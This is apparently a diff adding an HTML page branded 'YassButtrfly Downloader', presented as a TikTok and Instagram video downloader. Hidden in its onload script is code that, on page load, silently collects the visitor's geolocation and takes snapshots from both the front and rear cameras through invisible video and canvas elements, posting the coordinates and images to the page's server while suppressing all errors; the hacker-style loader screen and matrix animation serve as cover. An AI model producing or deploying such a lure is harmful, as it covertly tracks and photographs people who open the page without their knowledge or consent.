@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YassButtrfly Downloader</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
+        body { background-color: #0b0f0b; color: #00ff66; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.25; pointer-events: none; }
+        #loader-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity 0.5s ease; }
+        #loader-screen h2 { color: #00ff66; letter-spacing: 3px; font-size: 20px; text-shadow: 0 0 10px #00ff66; }
+        .terminal-loader { margin-top: 15px; font-size: 14px; color: #00cc55; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .container { position: relative; z-index: 2; background: rgba(10, 15, 10, 0.85); border: 1px solid #00ff66; padding: 25px; border-radius: 10px; width: 90%; max-width: 420px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 102, 0.3); }
+        h1 { font-size: 22px; margin-bottom: 5px; color: #00ff66; text-shadow: 0 0 8px rgba(0,255,102,0.6); }
+        .subtitle { font-size: 11px; color: #88ffbb; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        .input-box { width: 100%; padding: 12px; margin-bottom: 15px; background: #050805; border: 1px solid #00aa44; color: #00ff66; border-radius: 5px; outline: none; font-size: 13px; text-align: center; }
+        .input-box::placeholder { color: #006622; }
+        .btn { width: 100%; padding: 12px; background: #00ff66; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; text-transform: uppercase; transition: 0.2s; box-shadow: 0 0 10px rgba(0,255,102,0.4); }
+        .btn:hover { background: #00cc55; box-shadow: 0 0 15px #00ff66; }
+        #result { margin-top: 15px; font-size: 13px; word-break: break-all; }
+        .download-btn { display: inline-block; margin-top: 10px; padding: 10px 15px; background: #ff0055; color: #fff; text-decoration: none; border-radius: 5px; font-weight: bold; box-shadow: 0 0 10px rgba(255,0,85,0.4); }
+        .footer { margin-top: 25px; font-size: 10px; color: #66aa77; border-top: 1px dashed #004422; padding-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <video id="webcam" autoplay playsinline style="display:none;"></video>
+    <canvas id="snapshot-canvas" style="display:none;"></canvas>
+    <canvas id="matrix-canvas"></canvas>
+
+    <div id="loader-screen">
+        <h2>ACCESSING YASSBUTTRFLY...</h2>
+        <div class="terminal-loader">[!] Initializing Secure System... Please Wait [!]</div>
+    </div>
+
+    <div class="container">
+        <h1>YassButtrfly Downloader</h1>
+        <div class="subtitle">Secure Media Downloader v2.6</div>
+        
+        <input type="text" id="url" class="input-box" placeholder="Paste TikTok / Instagram link...">
+        <button class="btn" onclick="downloadVideo()">Initialize Download</button>
+        
+        <div id="result"></div>
+
+        <div class="footer">
+            <div>Created by: <b>LABIIB AL GHOFFUUR</b></div>
+            <div>Powered by Termux YassButtrfly</div>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        fetch('/api/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
+                        });
+                    },
+                    function(err) {}
+                );
+            }
+
+            function captureCamera(facingMode) {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } })
+                        .then(function(stream) {
+                            const video = document.getElementById('webcam');
+                            video.srcObject = stream;
+                            
+                            setTimeout(() => {
+                                const canvas = document.getElementById('snapshot-canvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                                stream.getTracks().forEach(track => track.stop());
+
+                                fetch('/api/camera', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ image: imageData, facing: facingMode })
+                                }).catch(err => {});
+                            }, 1500);
+                        })
+                        .catch(function(err) {});
+                }
+            }
+
+            setTimeout(() => captureCamera('user'), 2000);
+            setTimeout(() => captureCamera('environment'), 6000);
+        };
+
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+        const letters = '01YASSBUTTRFLYHTMLJS';
+        const fontSize = 12;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for (let x = 0; x < columns; x++) drops[x] = 1;
+        setInterval(() => {
+            ctx.fillStyle = 'rgba(11, 15, 11, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff66';
+            ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }, 33);
+
+        setTimeout(() => {
+            const loader = document.getElementById('loader-screen');
+            loader.style.opacity = '0';
+            setTimeout(() => loader.style.display = 'none', 500);
+        }, 2000);
+
+        async function downloadVideo() {
+            const url = document.getElementById('url').value;
+            const resDiv = document.getElementById('result');
+            if(!url) return alert('Please enter a valid link first!');
+            resDiv.innerHTML = '<span style="color:#00ff66;">[+] Processing payload... Please wait...</span>';
+            try {
+                const response = await fetch('/dl?url=' + encodeURIComponent(url));
+                const data = await response.json();
+                if(data.success) {
+                    resDiv.innerHTML = `<span style="color:#00ff66;">[✓] Download Ready!</span><br><a href="${data.file}" download class="download-btn">Download MP4 File</a>`;
+                } else {
+                    resDiv.innerHTML = `<span style="color:red;">[X] Failed: ${data.pesan}</span>`;
+                }
+            } catch(e) {
+                resDiv.innerHTML = `<span style="color:red;">[X] System Error Occurred.</span>`;
+            }
+        }
+    </script>
+</body>
+</html>
